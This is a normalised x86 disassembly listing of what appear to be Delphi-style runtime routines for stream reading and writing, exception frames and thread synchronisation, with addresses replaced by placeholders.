call sub_41d94c
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_417688
jmp r-xdata
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41e2a4
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41e7e8
pop ecx
jmp r-xdata
sub_41ec4c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor esi esi
mov eax ebx
mov edx edi
call sub_403ff8
jmp r-xdata
mov eax [ ebx ]
call sub_41a15c
test al al
je r-xdata
inc esi
push ebx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_4092bc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ecac
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41efc7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41f094
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_41efa5
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41ef66
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41f0b8
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41f0b8
mov eax [ ebp - 0x1c ]
call sub_419d30
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41f0b8
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x2
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_41f0b8
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_41ec4c
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41f0b8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
push 0x1
mov eax [ ebp - 0xc ]
call sub_40319c
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_419a80
mov edx [ ebp - 0x4 ]
mov [ edx + 0x74 ] eax
xor eax eax
push ebp
push sub_41ef0b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1c ] edx
call sub_406138
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
and [ eax + 0x1c ] 0xfffd
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_41a474
xor eax eax
push ebp
push sub_41eeeb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_41a62c
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41eef2
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_403254
inc ebx
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_41a5d0
mov edx [ eax ]
call [ edx + 0xc ]
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
sub_41ef3c
call sub_402854
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403a5c
jmp r-xdata
call sub_403a08
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_41d040
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41efac
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41ef6b
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_41d1e8
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_403a08
call sub_403a5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41efac
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0xc ]
call sub_403254
sub_41efd8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41f082
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41f055
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41f294
cmp al 0xb
je r-xdata
mov eax ebx
call sub_4168b0
mov eax [ eax + 0x1 ]
mov esi [ eax ]
xor ebx ebx
call sub_41d330
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_41d368
cmp eax 0x1f
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f089
lea eax [ ebp - 0x8 ]
call sub_403fa4
retn
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41f0b8
cmp [ ebp - 0x8 ] 0x0
je r-xdata
bts ebx eax
jmp r-xdata
sub_41f0b8
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41d858
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_404094
mov eax esi
call j_sub_404470#2
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_41d858
pop edx
pop esi
pop ebx
retn
sub_41f0f4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41f1a1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41d834
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_41f1b0
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_40422c
jmp r-xdata
sub al 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f1a8
lea eax [ ebp - 0x8 ]
call sub_4046b0
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41f294
sub al 0x6
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_41d858
jmp r-xdata
sub al 0x6
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4045f0
mov edx [ esi ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41d858
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41d858
jmp r-xdata
jmp r-xdata
call sub_41d330
sub_41f1b0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41f287
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41d834
sub al 0x6
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41f0f4
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4047fc
jmp r-xdata
sub al 0x6
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f28e
lea eax [ ebp - 0xc ]
call sub_403fa4
lea eax [ ebp - 0x8 ]
call sub_403fa4
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41f294
sub al 0x12
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41d858
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4048f8
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx [ esi ]
mov eax ebx
call sub_41d858
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41d858
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_4045f0
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41d858
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_405dd8
jmp r-xdata
jmp r-xdata
call sub_41d330
sub_41f2a8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41f2e4
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41f0b8
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f2eb
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_41f2f0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41d4f0
test al al
je r-xdata
mov eax [ ebx ]
call sub_41f3a4
mov eax [ ebx ]
call sub_41e45c
pop ebx
pop ebp
retn
sub_41f318
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_41d858
mov edx [ ebp - 0x4 ]
imul edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41f79c
pop ebx
pop ecx
pop ebp
retn
sub_41f348
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41d4f0
test al al
je r-xdata
mov eax [ ebx ]
call sub_41d834
add al 0xfe
sub al 0x3
jae r-xdata
mov eax [ ebx ]
call sub_41e45c
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edx 0x1
call sub_41f79c
jmp r-xdata
mov eax [ ebx ]
call sub_41f3a4
mov eax [ ebx ]
call sub_41d4f0
test al al
je r-xdata
mov eax [ ebx ]
call sub_41f540
mov eax [ ebx ]
call sub_41e45c
sub_41f3a4
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41f533
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41f294
and eax 0x7f
cmp eax 0x14
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f53a
lea eax [ ebp - 0x8 ]
call sub_403fa4
retn
jmp [ eax * 4 + jump_table_41f3db ]
push ebp
call sub_41f2f0
pop ecx
jmp r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_41f79c
jmp r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_41f79c
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41f79c
jmp r-xdata
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_41f79c
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41f0b8
jmp r-xdata
push ebp
mov eax 0x1
call sub_41f318
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41f2a8
jmp r-xdata
push ebp
mov eax 0x1
call sub_41f318
pop ecx
jmp r-xdata
push ebp
call sub_41f348
pop ecx
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41f79c
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41f79c
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41f79c
jmp r-xdata
push ebp
mov eax 0x2
call sub_41f318
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41f79c
jmp r-xdata
push ebp
mov eax 0x1
call sub_41f318
pop ecx
sub_41f540
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41f57d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41f0b8
mov eax ebx
call sub_41f3a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f584
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_41f588
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_41f620
push [ fs : eax ]
mov [ fs : eax ] esp
test dl dl
je r-xdata
mov eax ebx
call sub_41d4f0
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x24 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41f0b8
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_41f0b8
jmp r-xdata
mov eax ebx
call sub_41f540
mov eax ebx
call sub_41e45c
jmp r-xdata
mov eax ebx
call sub_41d4f0
test al al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_41f588
mov eax ebx
call sub_41e45c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f627
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fc8
retn
sub_41f630
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41f6d5
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_40403c
xor eax eax
mov [ ebp - 0x4 ] eax
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4204cc
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f6dc
lea eax [ ebp - 0x8 ]
call sub_403fa4
retn
cmp [ ebx + 0x52 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd20
call sub_4039e0
sub_41f700
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov edx [ esi ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop edi
pop esi
pop ebx
retn
push esi
mov edi eax
mov ecx ebx
mov edx eax
mov eax [ edi + 0x44 ]
call [ edi + 0x40 ]
sub_41f728
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov ecx esi
mov edx [ ebx + 0x18 ]
mov eax ebx
call sub_41d788
mov [ esp ] eax
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x18 ]
je r-xdata
mov eax esi
call sub_419c70
mov edx [ r-xdata ]
mov eax [ esp ]
call sub_403480
test al al
jne r-xdata
mov ecx esi
mov edx [ ebx + 0x1c ]
mov eax ebx
call sub_41d788
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_41f79c
push ebx
push esi
add esp 0xffffff00
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
add esp 0x100
pop esi
pop ebx
retn
cmp ebx 0x100
jle r-xdata
mov edx esp
mov ecx ebx
mov eax esi
call sub_41d858
xor ebx ebx
mov edx esp
mov ecx 0x100
mov eax esi
call sub_41d858
sub ebx 0x100
jmp r-xdata
test ebx ebx
jg r-xdata
sub_41f7e4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41f98d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xa
call sub_41d3bc
xor eax eax
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41f968
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_41d858
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_41c2e8
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_41d858
push 0x400
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cc78
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41f943
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_41f0f4
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0xc ]
call sub_41d858
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x8 ]
call sub_41c2e8
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41d858
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_415c94
test al al
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bce4
call sub_4039e0
lea eax [ ebp - 0x1c ]
call sub_405a08
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_40d7bc
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x4 ]
mov [ ebx ] ax
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f94a
mov eax [ ebp - 0xc ]
call sub_403254
retn
sub_41f9ac
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41fba6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40f550
mov eax [ ebp - 0x4 ]
call sub_41d834
and eax 0x7f
cmp eax 0x14
ja r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bce4
call sub_4039e0
jmp [ eax * 4 + jump_table_41f9ee ]
mov eax [ ebp - 0x4 ]
call sub_41f294
cmp al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e3a4
mov edx eax
movsx edx dl
mov eax ebx
mov cl 0xff
call sub_413958
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e3a4
mov edx eax
movsx edx dx
mov eax ebx
mov cl 0xfe
call sub_413958
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e3a4
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_413958
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e188
mov eax ebx
call sub_413b50
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e1cc
mov eax ebx
call sub_413b50
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e210
mov eax ebx
call sub_413b78
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e260
mov eax ebx
call sub_413b64
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41f0f4
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_413b8c
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41f1b0
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_413c08
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41f294
cmp al 0x9
sete dl
mov eax ebx
call sub_413b28
jmp r-xdata
push ebp
lea eax [ ebp - 0x1c ]
call sub_41f7e4
pop ecx
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_40f878
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e410
push edx
push eax
mov eax ebx
call sub_413a54
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fbad
lea eax [ ebp - 0x1c ]
call sub_40f564
lea eax [ ebp - 0xc ]
call sub_4046b0
lea eax [ ebp - 0x8 ]
call sub_403fa4
retn
mov eax ebx
call sub_415d7c
jmp r-xdata
sub_41fbb4
push esi
push edi
push ebx
mov esi edx
mov ebx ecx
mov edi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax edi
call sub_41fc00
mov ecx [ edi + 0xc ]
sub ebx ecx
push edi
mov eax [ edi + 0x8 ]
add eax [ edi + 0x10 ]
add [ edi + 0x10 ] ecx
mov edi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov ecx ebx
sub_41fc2c
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
cmp [ esp ] 0xffffff80
jl r-xdata
cmp [ esp ] 0xffff8000
jl r-xdata
cmp [ esp ] 0x7f
jg r-xdata
mov dl 0x4
mov eax ebx
call sub_41fd9c
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41fbb4
cmp [ esp ] 0x7fff
jg r-xdata
mov dl 0x2
mov eax ebx
call sub_41fd9c
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41fbb4
pop edx
pop ebx
retn
mov dl 0x3
mov eax ebx
call sub_41fd9c
mov edx esp
mov ecx 0x2
mov eax ebx
call sub_41fbb4
jmp r-xdata
pop edx
pop ebx
retn
sub_41fcb0
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
mov edx edi
call sub_4043b0
je r-xdata
mov eax esi
call sub_404264
mov [ esp ] eax
cmp [ esp ] 0xff
jg r-xdata
mov eax edi
call sub_404264
mov [ esp ] eax
mov dl 0x14
mov eax ebx
call sub_41fd9c
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41fbb4
mov edx edi
mov ecx [ esp ]
mov eax ebx
call sub_41fbb4
jmp r-xdata
mov dl 0xc
mov eax ebx
call sub_41fd9c
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41fbb4
mov dl 0x6
mov eax ebx
call sub_41fd9c
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41fbb4
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ esp ]
mov eax ebx
call sub_41fbb4
sub_41fd48
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41fd8d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405e7c
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_41fcb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fd94
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_41fe24
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
je r-xdata
test ebx ebx
jle r-xdata
call GetCurrentThreadId
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd20
call sub_4039e0
call sub_41fdfc
mov eax ebx
call sub_41fe08
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41ffb2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push rw-data
call InterlockedExchange
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41ff93
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ff9a
mov eax [ ebp - 0xc ]
call sub_403254
retn
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41a5d0
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41a4c0
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_41ff5d
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41ff2e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call EnterCriticalSection
retn
sub_41ffc4
push ebx
push esi
push edi
test dl dl
je r-xdata
